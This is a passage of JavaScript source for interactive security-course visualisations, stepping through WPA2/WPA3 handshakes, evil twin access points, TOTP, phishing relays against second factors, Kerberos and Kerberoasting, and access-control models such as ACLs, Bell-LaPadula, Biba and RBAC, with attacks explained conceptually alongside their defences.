   Network and Systems 1.3  WPA2-PSK four way handshake against WPA3-SAE: can a captured handshake be cracked?
   ===================================================================================================== */
(() => {
  const { trace } = MLZ;
  const { cbox, D } = CYZ;
  trace('cyhandshake', {
    title: 'WPA2 against WPA3: what a captured handshake gives away',
    sub: 'Both phone and access point know the Wi-Fi password. WPA2-Personal turns it straight into the master key, so a recorded handshake lets an attacker test guesses offline. WPA3 first runs SAE, a password authenticated key exchange with fresh secrets each time.',
    W: 600, H: 340,
    params: [
      { k: 'ver', label: 'Protocol', type: 'select', v: 'wpa2', opts: [['wpa2', 'WPA2-Personal (PSK)'], ['wpa3', 'WPA3-Personal (SAE)']] }
    ],
    tips: [
      { t: 'Play WPA2. The attacker records messages 1 and 2, then tries a word list at home until the MIC matches.', play: true },
      { t: 'Choose WPA3. The recorded SAE exchange depends on random secrets the attacker never sees, so each guess needs a live attempt that the access point can limit.', set: { ver: 'wpa3' }, play: true }
    ],
    frames(p) {
      const v2 = p.ver === 'wpa2';
      const m = v2 ? [
        ['both', 'PMK = PBKDF2(password, SSID, 4096) on both sides', 'Both sides turn the password into the 256 bit pairwise master key. The same password and SSID always give the same PMK.'],
        ['ap', 'msg 1: ANonce', 'The access point sends a random ANonce, in the clear.'],
        ['sta', 'msg 2: SNonce + MIC', 'The phone picks SNonce, computes PTK = PRF(PMK, MACs, ANonce, SNonce) and sends SNonce with a MIC made with part of the PTK.'],
        ['ap', 'msg 3: GTK (encrypted) + MIC', 'The access point derives the same PTK, checks the MIC, and sends the group key encrypted.'],
        ['sta', 'msg 4: ACK + MIC', 'The phone confirms. Both install the keys and start CCMP encryption.']
      ] : [
        ['both', 'password element PE = hash to curve(password, MACs)', 'Both sides map the password to a point on an elliptic curve. Nothing about it is sent.'],
        ['sta', 'SAE commit: scalar + element (fresh randoms)', 'The phone picks random secrets and sends a commit built from them and PE.'],
        ['ap', 'SAE commit: scalar + element (fresh randoms)', 'The access point does the same with its own random secrets.'],
        ['both', 'SAE confirm both ways, PMK = from the shared secret', 'Each side proves it derived the same secret. The PMK comes from a fresh Diffie-Hellman style secret, so it differs every time.'],
        ['both', '4 way handshake with that PMK', 'The usual 4 way handshake follows, now keyed by the fresh PMK.']
      ];
      const fr = [];
      m.forEach((r, i) => fr.push({ st: 1, n: i + 1, say: r[2] }));
      fr.push({ st: 2, done: true, n: m.length, say: v2 ? 'The attacker recorded messages 1 and 2 (or just the PMKID from message 1, Steube 2018). At home, for each word: PMK, then PTK, then MIC, and compare. GPUs test hundreds of thousands of words per second, so only a long random password is safe. And anyone who knows the password can decrypt recorded sessions.' : 'The recording is useless offline: checking a guess needs the random secrets inside the commits. Each guess means a live SAE attempt, which the access point can slow down. A fresh PMK every time also gives forward secrecy. Early implementations had side channel flaws (Dragonblood, 2019), fixed by later updates.' });
      return fr.map(x => ({ ...x, v2, m }));
    },
    paint(z, f) {
      const col = z.col, g = z.g;
      cbox(z, 14, 12, 120, 34, 'phone', { s: 13, b: true, fill: col.surf }); cbox(z, 466, 12, 120, 34, 'access point', { s: 13, b: true, fill: col.surf });
      D.line(g, 74, 46, 74, 270, col.line, 1.5, [4, 4]); D.line(g, 526, 46, 526, 270, col.line, 1.5, [4, 4]);
      f.m.slice(0, f.n).forEach((r, i) => {
        const y = 62 + i * 42;
        if (r[0] === 'both') cbox(z, 90, y, 420, 30, r[1], { s: 11, b: true, mono: true, fill: col.bg });
        else { const ap = r[0] === 'ap'; D.arrow(g, ap ? 520 : 80, y + 26, ap ? 80 : 520, y + 26, col.cv, 2); cbox(z, 140, y, 320, 22, r[1], { s: 11, b: true, mono: true, fill: col.surf }); }
      });
      if (f.done) {
        cbox(z, 14, 278, 572, 22, f.v2 ? 'attacker: record, then guess offline at GPU speed' : 'attacker: recording gives nothing to test offline', { s: 11, b: true, fill: col.surf, c: f.v2 ? col.red : col.cv });
        cbox(z, 14, 306, 572, 28, f.v2 ? 'WPA2-PSK: offline dictionary attack possible' : 'WPA3-SAE: online guessing only, forward secrecy', { s: 13, b: true, fill: f.v2 ? col.red : col.cv, c: '#fff' });
      }
    }
  });
})();

/* =====================================================================================================
   Network and Systems 1.3  An evil twin access point against four kinds of Wi-Fi security
   ===================================================================================================== */
(() => {
  const { trace } = MLZ;
  const { cbox, D } = CYZ;
  trace('cyeviltwin', {
    title: 'Evil twin: a fake access point with the same name',
    sub: 'Devices join the strongest signal with a known network name. An attacker sets up a twin of "CorpWiFi" close to the victim. Whether the twin gets anything depends on how the network authenticates.',
    W: 600, H: 340,
    params: [
      { k: 'sec', label: 'Network security', type: 'select', v: 'eapbad', opts: [['open', 'Open network'], ['psk', 'WPA2-PSK, password on the wall'], ['eapbad', '802.1X, certificate check OFF'], ['eap', '802.1X, certificate checked'], ['sae', 'WPA3-SAE, password secret']] }
    ],
    tips: [
      { t: 'Play 802.1X with the certificate check off. The phone talks to the twin’s fake RADIUS server and hands over a crackable login hash.', play: true },
      { t: 'Turn the certificate check on. The twin cannot show the company’s server certificate, so the phone refuses before sending anything.', set: { sec: 'eap' }, play: true },
      { t: 'Try a shared password on the wall. The attacker knows it too, so the twin works perfectly.', set: { sec: 'psk' }, play: true }
    ],
    frames(p) {
      const s = p.sec;
      const fr = [
        { st: 1, say: 'The real CorpWiFi access point is down the corridor, signal &minus;60 dBm.' },
        { st: 2, say: 'The attacker’s twin broadcasts the same name, CorpWiFi, right next to the victim at &minus;38 dBm. It may also send deauthentication frames to push devices off the real one (802.11w protection frames stop this, and WPA3 requires them).' },
        { st: 3, say: 'The phone sees a stronger CorpWiFi and tries to join it.' }
      ];
      const out = {
        open: ['joined', 'Open network: nothing proves who the access point is. The phone joins, and the twin sees all traffic not protected by TLS.'],
        psk: ['joined', 'The password is shared with everyone, including the attacker, so the twin completes the WPA2 handshake. A shared password authenticates the network to no one who also knows it.'],
        eapbad: ['leak', 'With the server certificate check off, the phone accepts the twin’s fake RADIUS server and runs PEAP with MSCHAPv2, giving the attacker a challenge and response that can be cracked offline to get the user’s password.'],
        eap: ['refused', 'The phone checks that the server certificate is the company’s, signed by the company CA, with the right name. The twin cannot show it, so the phone stops before sending credentials.'],
        sae: ['refused', 'The twin does not know the WPA3 password, so the SAE exchange fails, and it cannot learn the password by recording it.']
      }[s];
      fr.push({ st: 4, done: true, res: out[0], say: out[1] });
      return fr.map(x => ({ ...x, s }));
    },
    paint(z, f) {
      const col = z.col, g = z.g;
      if (f.st >= 1) cbox(z, 440, 30, 146, 50, ['real CorpWiFi', '−60 dBm'], { s: 12, b: true, fill: col.surf });
      if (f.st >= 2) cbox(z, 220, 200, 160, 50, ['twin "CorpWiFi"', '−38 dBm'], { s: 12, b: true, fill: 'rgba(225,29,72,0.15)' });
      cbox(z, 14, 110, 120, 50, ['phone', 'saved: CorpWiFi'], { s: 12, b: true, fill: col.bg });
      if (f.st >= 3) { D.arrow(g, 134, 145, 220, 215, col.orange, 2.5); D.line(g, 134, 125, 440, 60, col.line, 1.5, [5, 5]); }
      if (f.done) {
        const bad = f.res !== 'refused';
        cbox(z, 400, 200, 186, 50, f.res === 'joined' ? ['joined the twin', 'traffic exposed'] : f.res === 'leak' ? ['login hash sent', 'crackable offline'] : ['refused', 'nothing sent'], { s: 12, b: true, fill: bad ? col.red : col.green, c: '#fff' });
        cbox(z, 14, 306, 572, 28, bad ? 'evil twin succeeds' : 'evil twin fails: the network proves who it is', { s: 13, b: true, fill: bad ? col.red : col.cv, c: '#fff' });
      }
    }
  });
})();

/* =====================================================================================================
   Network and Systems 2.1  TOTP step by step (RFC 6238 with HMAC-SHA-256, checked against the RFC vectors)
   ===================================================================================================== */
(() => {
  const { trace } = MLZ;
  const { cbox, D, sha256, utf8 } = CYZ;
  const hmac = (key, msg) => {
    let k = key.length > 64 ? sha256(key) : key.slice();
    while (k.length < 64) k.push(0);
    const ip = k.map(b => b ^ 0x36), op = k.map(b => b ^ 0x5c);
    return sha256(op.concat(sha256(ip.concat(msg))));
  };
  const hx = a => a.map(b => b.toString(16).padStart(2, '0')).join('');
  const KEY = utf8('12345678901234567890123456789012');
  trace('cytotp', {
    title: 'TOTP: how an authenticator app makes a code',
    sub: 'Phone and server share a secret key. Both count 30 second time slots since 1970, run HMAC on the slot number and cut the result down to a short code. These are the RFC 6238 SHA-256 test values, so you can check every step.',
    W: 600, H: 340,
    params: [
      { k: 't', label: 'Unix time (seconds)', type: 'select', v: '59', opts: [['59', '59'], ['1111111109', '1111111109'], ['1234567890', '1234567890'], ['2000000000', '2000000000']] },
      { k: 'dg', label: 'Digits', type: 'select', v: '8', opts: [['8', '8 (RFC test values)'], ['6', '6 (authenticator apps)']] }
    ],
    tips: [
      { t: 'Play t = 59 with 8 digits. The final code is 46119246, the value printed in RFC 6238.', play: true },
      { t: 'Switch to 6 digits. Apps keep the last 6 digits of the same number, so the code is 119246.', set: { dg: '6' }, play: true },
      { t: 'Try t = 1234567890. RFC 6238 lists 91819424 for SHA-256 at this time.', set: { t: '1234567890', dg: '8' }, play: true }
    ],
    frames(p) {
      const t = +p.t, dg = +p.dg, T = Math.floor(t / 30);
      const msg = []; let v = T; for (let i = 0; i < 8; i++) { msg.unshift(v % 256); v = Math.floor(v / 256); }
      const mac = hmac(KEY, msg), off = mac[31] & 15;
      const bin = ((mac[off] & 0x7f) * 16777216) + mac[off + 1] * 65536 + mac[off + 2] * 256 + mac[off + 3];
      const code = String(bin % 10 ** dg).padStart(dg, '0');
      const fr = [
        { st: 1, say: `Shared secret K (32 bytes of ASCII "1234...9012" in the RFC). Unix time t = ${t}.` },
        { st: 2, say: `Time slot T = floor(t / 30) = <b>${T}</b>, written as 8 bytes: ${hx(msg)}. Phone and server get the same T if their clocks agree within the slot.` },
        { st: 3, say: `HMAC-SHA-256(K, T) gives 32 bytes. Without K nobody can predict them, and old codes say nothing about new ones.` },
        { st: 4, say: `Dynamic truncation: the last byte is 0x${mac[31].toString(16).padStart(2, '0')}, its low 4 bits give offset = <b>${off}</b>. Take the 4 bytes starting there.` },
        { st: 5, say: `Those 4 bytes with the top bit cleared: ${hx(mac.slice(off, off + 4))} &rarr; <b>${bin}</b>.` },
        { st: 6, done: true, say: `Code = ${bin} mod 10<sup>${dg}</sup> = <b>${code}</b>. A guesser has a 1 in ${(10 ** dg).toLocaleString('en')} chance per try, so servers also limit attempts.` }
      ];
      return fr.map(x => ({ ...x, t, T, msg, mac, off, bin, code, dg }));
    },
    paint(z, f) {
      const col = z.col, g = z.g;
      cbox(z, 14, 12, 280, 32, `K = ${hx(KEY.slice(0, 8))}...`, { s: 12, b: true, mono: true, fill: col.surf });
      cbox(z, 306, 12, 280, 32, `t = ${f.t}`, { s: 13, b: true, mono: true, fill: col.surf });
      if (f.st >= 2) cbox(z, 14, 54, 572, 32, `T = floor(t / 30) = ${f.T}  →  ${hx(f.msg)}`, { s: 12, b: true, mono: true, fill: col.bg });
      if (f.st >= 3) {
        D.text(g, 'HMAC-SHA-256(K, T)', 14, 106, { s: 11, b: true, c: col.ink2 });
        for (let i = 0; i < 32; i++) {
          const x = 14 + (i % 16) * 36, y = 114 + Math.floor(i / 16) * 32, hot = f.st >= 4 && i >= f.off && i < f.off + 4, last = f.st >= 4 && i === 31;
          cbox(z, x, y, 32, 26, f.mac[i].toString(16).padStart(2, '0'), { s: 11, b: true, mono: true, fill: hot ? col.cv : last ? col.orange : col.surf, c: hot || last ? '#fff' : col.ink });
        }
      }
      if (f.st >= 4) D.text(g, `offset = last byte & 0x0F = ${f.off}`, 14, 194, { s: 12, b: true, c: col.orange });
      if (f.st >= 5) cbox(z, 14, 206, 572, 32, `31 bit number: ${f.bin}`, { s: 13, b: true, mono: true, fill: col.bg });
      if (f.st >= 6) cbox(z, 150, 248, 300, 48, f.code, { s: 26, b: true, mono: true, fill: col.cv, c: '#fff' });
      if (f.done) cbox(z, 14, 306, 572, 28, 'same secret + same time slot = same code on phone and server', { s: 13, b: true, fill: col.surf, c: col.cv });
    }
  });
})();

/* =====================================================================================================
   Network and Systems 2.1  A real time phishing relay against passwords, one time codes, push and passkeys
   ===================================================================================================== */
(() => {
  const { trace } = MLZ;
  const { cbox, D } = CYZ;
  trace('cyphish', {
    title: 'Phishing relay: which second factor survives?',
    sub: 'The victim clicks a link to bank-example.login.test, a copy of the bank’s page run by the attacker, who passes everything to the real bank in real time. Choose the second factor and see if the attacker gets in.',
    W: 600, H: 340,
    params: [
      { k: 'f', label: 'Second factor', type: 'select', v: 'totp', opts: [['none', 'Password only'], ['totp', 'SMS or authenticator code'], ['push', 'Push approval'], ['number', 'Push with number matching'], ['passkey', 'Passkey (FIDO2 / WebAuthn)']] }
    ],
    tips: [
      { t: 'Play the authenticator code. The victim types it into the fake page and the attacker uses it within the same 30 seconds.', play: true },
      { t: 'Choose a passkey. The browser signs a challenge together with the real origin it sees, so the bank rejects the relayed answer.', set: { f: 'passkey' }, play: true },
      { t: 'Try plain push. Attackers send prompt after prompt until a tired user taps Approve, as in the 2022 Uber breach.', set: { f: 'push' }, play: true }
    ],
    frames(p) {
      const f = p.f;
      const fr = [
        { st: 1, say: 'An email says the account is locked. The link opens bank-example.login.test, which looks exactly like the bank.' },
        { st: 2, say: 'The victim types user name and password. The fake site forwards them to the real bank at once.' }
      ];
      const end = {
        none: [true, 'With a password only, the attacker is already logged in. The password may also be reused on other sites, which is credential stuffing.'],
        totp: [true, 'The bank asks for a code, the fake page asks the victim, and the attacker relays it within the 30 second window. Codes stop password reuse and guessing, but not a live relay. Tools such as Evilginx automate this and steal the session cookie too.'],
        push: [true, 'The attacker triggers a push to the victim’s phone, again and again. A tired or confused user taps Approve. This MFA fatigue attack was used against Uber in 2022.'],
        number: [true, 'Number matching shows a code on the login page that the user must type into the app. Fatigue spam fails, but a fake page can still show the real number and ask the user to type it, so a live relay still works. Better, but not phishing resistant.'],
        passkey: [false, 'The bank sends a challenge. The browser asks the passkey to sign it together with the origin it is really on: bank-example.login.test. The bank expects https://bank.example, so it rejects the answer. The user cannot be tricked into signing for the wrong site, because the browser fills in the origin.']
      }[f];
      if (f !== 'none') fr.push({ st: 3, say: f === 'passkey' ? 'The real bank sends a WebAuthn challenge. The attacker passes it to the fake page.' : f === 'totp' ? 'The real bank asks for a one time code. The fake page asks the victim for it.' : 'The real bank sends a push request to the victim’s phone.' });
      fr.push({ st: 4, done: true, ok: end[0], say: end[1] });
      return fr.map(x => ({ ...x, f }));
    },
    paint(z, f) {
      const col = z.col, g = z.g;
      cbox(z, 14, 40, 130, 50, ['victim', 'browser'], { s: 13, b: true, fill: col.surf });
      cbox(z, 235, 40, 130, 50, ['fake site', 'login.test'], { s: 12, b: true, fill: 'rgba(225,29,72,0.15)' });
      cbox(z, 456, 40, 130, 50, ['real bank', 'bank.example'], { s: 12, b: true, fill: col.surf });
      if (f.st >= 1) D.arrow(g, 144, 65, 231, 65, col.orange, 2);
      if (f.st >= 2) { D.arrow(g, 365, 65, 452, 65, col.red, 2); cbox(z, 150, 104, 300, 26, 'user + password relayed', { s: 12, b: true, mono: true, fill: col.bg }); }
      if (f.st >= 3) cbox(z, 150, 140, 300, 26, f.f === 'passkey' ? 'challenge relayed, signed for login.test' : f.f === 'totp' ? 'code 482915 relayed in time' : 'push to phone', { s: 12, b: true, mono: true, fill: col.bg });
      if (f.done) {
        cbox(z, 150, 190, 300, 50, f.ok ? ['attacker logged in', 'session cookie stolen'] : ['bank rejects', 'wrong origin in signature'], { s: 13, b: true, fill: f.ok ? col.red : col.green, c: '#fff' });
        cbox(z, 14, 306, 572, 28, f.ok ? 'not phishing resistant' : 'phishing resistant: the origin is bound into the signature', { s: 13, b: true, fill: f.ok ? col.red : col.cv, c: '#fff' });
      }
    }
  });
})();

/* =====================================================================================================
   Network and Systems 2.1  Kerberos tickets, and the Kerberoasting attack on weak service passwords
   ===================================================================================================== */
(() => {
  const { trace } = MLZ;
  const { cbox, D } = CYZ;
  trace('cykerberos', {
    title: 'Kerberos: tickets instead of passwords',
    sub: 'A trusted Key Distribution Centre (KDC) shares a long term key with every user and service. Users prove themselves once, get a ticket granting ticket (TGT), and trade it for service tickets. No password crosses the network.',
    W: 600, H: 340,
    params: [
      { k: 'v', label: 'Show', type: 'select', v: 'normal', opts: [['normal', 'Normal login'], ['roast', 'Kerberoasting attack']] }
    ],
    tips: [
      { t: 'Play the normal login: AS exchange, TGS exchange, then the file server opens the ticket with its own key.', play: true },
      { t: 'Show Kerberoasting. Any user can ask for a service ticket, and it is encrypted with a key made from the service account’s password, which can be guessed offline.', set: { v: 'roast' }, play: true }
    ],
    frames(p) {
      const roast = p.v === 'roast';
      const fr = roast ? [
        { st: 1, a: 'c2k', l: 'TGS-REQ for MSSQLSvc/db01', say: 'An attacker with any normal domain account asks the KDC for a ticket to a service, for example a database run under a user account.' },
        { st: 2, a: 'k2c', l: 'service ticket {…} key = from service password', say: 'The KDC happily returns it. The ticket is encrypted with a key derived from the service account’s password.' },
        { st: 3, a: 'off', l: 'offline: guess password → key → decrypt?', say: 'The attacker takes the ticket home and tries passwords until one decrypts it. No more traffic, no lockouts, no alarms.' },
        { st: 4, done: true, bad: true, say: 'Defences: long random service passwords (25 or more characters) or group managed service accounts that rotate automatically, AES only (no RC4), and alerts on unusual ticket requests. A stolen krbtgt key is worse still: it lets attackers forge any TGT, a golden ticket.' }
      ] : [
        { st: 1, a: 'c2k', l: 'AS-REQ: "I am asha" + timestamp', say: 'AS exchange: Asha asks for a TGT. Pre authentication encrypts a timestamp with her password derived key, so the KDC knows she has it.' },
        { st: 2, a: 'k2c', l: 'TGT {asha, S1} krbtgt + {S1} asha', say: 'The KDC returns a TGT, encrypted with its own krbtgt key, and session key S1 encrypted with Asha’s key. Only the real Asha can open S1.' },
        { st: 3, a: 'c2k', l: 'TGS-REQ: TGT + authenticator {time} S1', say: 'TGS exchange: to reach the file server she shows the TGT and an authenticator made with S1. Her password is not needed again until the TGT expires, typically after 10 hours.' },
        { st: 4, a: 'k2c', l: 'ticket {asha, S2} files + {S2} S1', say: 'The KDC returns a service ticket encrypted with the file server’s key, and session key S2 for Asha.' },
        { st: 5, a: 'c2s', l: 'AP-REQ: ticket + authenticator {time} S2', say: 'AP exchange: the file server opens the ticket with its own key, finds S2, and checks the authenticator. It never contacts the KDC. Clocks must agree within about 5 minutes, which stops old authenticators being replayed.' },
        { st: 6, done: true, bad: false, say: 'Single sign on: one password entry, many services, and no password on the wire. Kerberos came from MIT’s Project Athena in the 1980s and is the heart of Microsoft Active Directory logins.' }
      ];
      return fr.map((x, i) => ({ ...x, roast, log: fr.slice(0, i + 1).filter(y => y.l) }));
    },
    paint(z, f) {
      const col = z.col, g = z.g;
      cbox(z, 14, 60, 120, 54, [f.roast ? 'attacker' : 'Asha', f.roast ? '(any user)' : 'client'], { s: 13, b: true, fill: f.roast ? 'rgba(225,29,72,0.15)' : col.surf });
      cbox(z, 240, 8, 120, 54, ['KDC', 'AS + TGS'], { s: 13, b: true, fill: col.surf });
      cbox(z, 466, 60, 120, 54, [f.roast ? 'db01' : 'file server', 'service'], { s: 13, b: true, fill: col.surf });
      const path = { c2k: [134, 72, 236, 44], k2c: [236, 50, 134, 82], c2s: [134, 100, 462, 100] }[f.a];
      if (path) D.arrow(g, path[0], path[1], path[2], path[3], col.orange, 3);
      f.log.forEach((y, i) => {
        const cur = i === f.log.length - 1 && !f.done;
        cbox(z, 14, 128 + i * 34, 572, 28, `${i + 1}. ${y.l}`, { s: 11, b: true, mono: true, fill: y.a === 'off' ? 'rgba(225,29,72,0.15)' : cur ? 'rgba(15,118,110,0.18)' : col.bg });
      });
      if (f.done) cbox(z, 14, 306, 572, 28, f.bad ? 'weak service passwords fall to offline guessing' : 'logged in to the service without sending a password', { s: 13, b: true, fill: f.bad ? col.red : col.cv, c: '#fff' });
    }
  });
})();

/* =====================================================================================================
   Network and Systems 2.2  The access matrix, read by columns (ACLs) or by rows (capability lists)
   ===================================================================================================== */
(() => {
  const { trace } = MLZ;
  const { cbox, D } = CYZ;
  const S = ['asha', 'ravi', 'build'], O = ['payroll', 'wiki', 'repo'];
  const M = { asha: { payroll: 'rw', wiki: 'rw', repo: '' }, ravi: { payroll: 'r', wiki: 'r', repo: '' }, build: { payroll: '', wiki: 'r', repo: 'r' } };
  trace('cymatrix', {
    title: 'The access matrix: ACLs or capabilities?',
    sub: 'Rows are subjects, columns are objects, and each cell holds the rights. Real systems never store the whole matrix. They store either each column with its object (an access control list) or each row with its subject (a capability list).',
    W: 600, H: 340,
    params: [
      { k: 'view', label: 'Store the matrix as', type: 'select', v: 'acl', opts: [['acl', 'ACLs (columns, kept with each object)'], ['cap', 'Capabilities (rows, kept with each subject)']] }
    ],
    tips: [
      { t: 'Play ACLs. Each file keeps its own list, so "who can read payroll?" is one lookup, and revoking one user from one file is easy.', play: true },
      { t: 'Choose capabilities. Each subject carries its rights like keys, so "what can ravi reach?" is one lookup, and passing a right on is easy, but revoking it is hard.', set: { view: 'cap' }, play: true }
    ],
    frames(p) {
      const acl = p.view === 'acl';
      const fr = [{ st: 1, hi: -1, say: 'The full matrix: 3 subjects by 3 objects. r = read, w = write, an empty cell means no rights. Real systems have millions of each, and most cells are empty.' }];
      const items = acl ? O : S;
      items.forEach((it, i) => {
        const list = acl ? S.filter(s => M[s][it]).map(s => `${s}: ${M[s][it]}`) : O.filter(o => M[it][o]).map(o => `${o}: ${M[it][o]}`);
        fr.push({ st: 2, hi: i, say: acl ? `Column "${it}" becomes its ACL: ${list.join(', ') || 'empty'}. The object carries it, like the permission bits and ACL of a file.` : `Row "${it}" becomes its capability list: ${list.join(', ') || 'empty'}. The subject carries these like keys, such as open file descriptors or signed tokens.` });
      });
      fr.push({ st: 3, done: true, hi: -1, say: acl ? 'ACLs: easy to review and revoke per object, the model of Unix, Windows and cloud storage policies. Hard to answer "everything this user can reach" without scanning every object.' : 'Capabilities: easy to delegate and to check without a central lookup, the model of file descriptors, object capability systems and many bearer tokens. Hard to revoke once handed out.' });
      return fr.map(x => ({ ...x, acl }));
    },
    paint(z, f) {
      const col = z.col, g = z.g, x0 = 120, y0 = 50, cw = 100, ch = 50;
      O.forEach((o, j) => cbox(z, x0 + j * cw, y0 - 36, cw - 6, 30, o, { s: 13, b: true, fill: f.acl && f.hi === j ? col.cv : col.surf, c: f.acl && f.hi === j ? '#fff' : col.ink }));
      S.forEach((s, i) => {
        cbox(z, 14, y0 + i * ch, 96, ch - 6, s, { s: 13, b: true, fill: !f.acl && f.hi === i ? col.cv : col.surf, c: !f.acl && f.hi === i ? '#fff' : col.ink });
        O.forEach((o, j) => {
          const on = f.st === 2 && (f.acl ? f.hi === j : f.hi === i);
          cbox(z, x0 + j * cw, y0 + i * ch, cw - 6, ch - 6, M[s][o] || '·', { s: 15, b: true, mono: true, fill: on ? 'rgba(15,118,110,0.25)' : col.bg });
        });
      });
      if (f.st >= 2) {
        const items = f.acl ? O : S, upto = f.st === 3 ? items.length - 1 : f.hi;
        for (let i = 0; i <= upto; i++) {
          const it = items[i];
          const list = f.acl ? S.filter(s => M[s][it]).map(s => `${s}:${M[s][it]}`) : O.filter(o => M[it][o]).map(o => `${o}:${M[it][o]}`);
          cbox(z, 432, 14 + i * 56, 154, 48, [f.acl ? `ACL ${it}` : `caps ${it}`, list.join(' ') || '(none)'], { s: 11, b: true, mono: true, fill: col.surf });
        }
      }
      if (f.done) cbox(z, 14, 306, 572, 28, f.acl ? 'ACL: "who can access this object?" is quick' : 'capability: "what can this subject access?" is quick', { s: 13, b: true, fill: col.cv, c: '#fff' });
    }
  });
})();

/* =====================================================================================================
   Network and Systems 2.2  Bell-LaPadula (no read up, no write down) against Biba (no read down, no write up)
   ===================================================================================================== */
(() => {
  const { trace } = MLZ;
  const { cbox, D } = CYZ;
  const LV = ['Unclassified', 'Confidential', 'Secret', 'Top Secret'];
  trace('cyblp', {
    title: 'Bell-LaPadula and Biba: which way may information flow?',
    sub: 'A subject at one level checks reads and writes against objects at every level. Bell-LaPadula protects secrecy, so information may only flow up. Biba protects integrity, so information may only flow down.',
    W: 600, H: 340,
    params: [
      { k: 'm', label: 'Model', type: 'select', v: 'blp', opts: [['blp', 'Bell-LaPadula (secrecy)'], ['biba', 'Biba (integrity)']] },
      { k: 'lv', label: 'Subject level', type: 'range', v: 2, min: 0, max: 3, step: 1 }
    ],
    tips: [
      { t: 'Play Bell-LaPadula for a Secret subject. It may read Secret and below, and write Secret and above, so secrets never leak down.', play: true },
      { t: 'Switch to Biba. The arrows flip: read only at or above your level, write only at or below, so untrusted data never contaminates trusted data.', set: { m: 'biba' }, play: true },
      { t: 'Set the level to Unclassified under Bell-LaPadula. It may write anywhere above, a blind write up, but read only Unclassified.', set: { m: 'blp', lv: 0 }, play: true }
    ],
    frames(p) {
      const blp = p.m === 'blp', s = +p.lv;
      const fr = [{ st: 0, rows: [], say: `Subject at level <b>${LV[s]}</b>. ${blp ? 'Bell-LaPadula (1973): simple security property, no read up, and star property, no write down.' : 'Biba (1977): simple integrity, no read down, and star integrity, no write up. Levels now mean trustworthiness.'}` }];
      const rows = [];
      for (let o = 3; o >= 0; o--) {
        const r = blp ? s >= o : o >= s, w = blp ? o >= s : s >= o;
        rows.push({ o, r, w });
        fr.push({ st: 1, rows: rows.slice(), say: `Object at ${LV[o]}: read ${r ? 'allowed' : 'denied'}, write ${w ? 'allowed' : 'denied'}. ${blp ? (o > s ? 'Reading would reveal higher secrets.' : o < s ? 'Writing down could leak secrets into lower files.' : 'Same level: both allowed.') : (o < s ? 'Reading could pull in untrusted data.' : o > s ? 'Writing up could corrupt more trusted data.' : 'Same level: both allowed.')}` });
      }
      fr.push({ st: 2, done: true, rows, say: blp ? 'Information can only move up the lattice. A Trojan horse running with this subject’s rights cannot copy a secret into a lower file. The cost: writing up blind, and no way to downgrade without a trusted subject.' : 'Information can only move down. Windows integrity levels follow this idea: a low integrity browser tab cannot write to medium or high integrity files and processes.' });
      return fr.map(x => ({ ...x, blp, s }));
    },
    paint(z, f) {
      const col = z.col, g = z.g;
      D.text(g, f.blp ? 'secrecy level' : 'integrity level', 14, 20, { s: 11, b: true, c: col.ink2 });
      for (let o = 3; o >= 0; o--) {
        const y = 30 + (3 - o) * 66;
        cbox(z, 14, y, 160, 54, f.blp ? LV[o] : ['Low', 'Medium', 'High', 'System'][o], { s: 13, b: true, fill: o === f.s ? 'rgba(15,118,110,0.25)' : col.surf });
        const row = f.rows.find(r => r.o === o);
        if (row) {
          cbox(z, 190, y + 6, 120, 42, row.r ? 'read ✓' : 'read ✗', { s: 13, b: true, fill: row.r ? col.green : col.red, c: '#fff' });
          cbox(z, 320, y + 6, 120, 42, row.w ? 'write ✓' : 'write ✗', { s: 13, b: true, fill: row.w ? col.green : col.red, c: '#fff' });
        }
      }
      cbox(z, 456, 30 + (3 - f.s) * 66, 130, 54, ['subject', f.blp ? LV[f.s] : ['Low', 'Medium', 'High', 'System'][f.s]], { s: 12, b: true, fill: col.cv, c: '#fff' });
      if (f.done) cbox(z, 14, 306, 572, 28, f.blp ? 'Bell-LaPadula: information flows only up' : 'Biba: information flows only down', { s: 13, b: true, fill: col.cv, c: '#fff' });
    }
  });
})();

/* =====================================================================================================
   Network and Systems 2.2  RBAC: users get roles, roles get permissions, seniors inherit, conflicts are refused
   ===================================================================================================== */
(() => {
  const { trace } = MLZ;
  const { cbox, D } = CYZ;
  const ROLES = { employee: ['read wiki', 'submit expense'], manager: ['approve expense'], accountant: ['pay expense', 'read ledger'] };
  const JUN = { manager: ['employee'], accountant: ['employee'] };
  trace('cyrbac', {
    title: 'Role based access control',
    sub: 'Permissions are given to roles, and users are given roles. Senior roles inherit junior roles. A separation of duties rule stops one person holding two roles that together allow fraud.',
    W: 600, H: 340,
    params: [
      { k: 'q', label: 'Question', type: 'select', v: 'approve', opts: [['approve', 'Can asha approve an expense?'], ['pay', 'Can asha pay an expense?'], ['wiki', 'Can ravi read the wiki?'], ['both', 'Make asha accountant too']] }
    ],
    tips: [
      { t: 'Play "can asha approve?". asha is a manager, and managers hold approve expense.', play: true },
      { t: 'Ask "can ravi read the wiki?". ravi is an accountant, which inherits employee, which holds read wiki.', set: { q: 'wiki' }, play: true },
      { t: 'Try to make asha an accountant too. Approving and paying the same expense must be split, so the assignment is refused.', set: { q: 'both' }, play: true }
    ],
    frames(p) {
      const q = p.q;
      const fr = [{ st: 1, say: 'Users: asha is a manager, ravi is an accountant. Roles: employee (read wiki, submit expense), manager (approve expense), accountant (pay expense, read ledger). Manager and accountant both inherit employee.' }];
      if (q === 'both') {
        fr.push({ st: 2, hl: ['asha', 'manager', 'accountant'], say: 'Request: add the accountant role to asha, who is already a manager.' });
        fr.push({ st: 3, done: true, ok: false, hl: ['manager', 'accountant'], say: 'Refused by static separation of duties: manager and accountant are mutually exclusive, because one person could then approve and pay their own expense claim. This is the RBAC version of the Clark-Wilson idea of separating duties.' });
      } else {
        const user = q === 'wiki' ? 'ravi' : 'asha', perm = { approve: 'approve expense', pay: 'pay expense', wiki: 'read wiki' }[q];
        const role = user === 'asha' ? 'manager' : 'accountant';
        fr.push({ st: 2, hl: [user, role], say: `${user} has the role ${role}.` });
        const direct = ROLES[role].includes(perm), inh = !direct && JUN[role].some(j => ROLES[j].includes(perm));
        fr.push({ st: 3, hl: [user, role].concat(inh ? ['employee'] : []).concat([perm]), say: direct ? `${role} holds "${perm}" directly.` : inh ? `${role} does not hold "${perm}", but it inherits employee, which does.` : `Neither ${role} nor the roles it inherits hold "${perm}".` });
        fr.push({ st: 4, done: true, ok: direct || inh, hl: [user, role].concat(inh ? ['employee'] : []).concat([perm]), say: direct || inh ? `Allowed. Change the role once and every manager or accountant changes with it, which is why RBAC scales.` : `Denied. To let asha pay, an admin would need to give her the accountant role, which separation of duties forbids.` });
      }
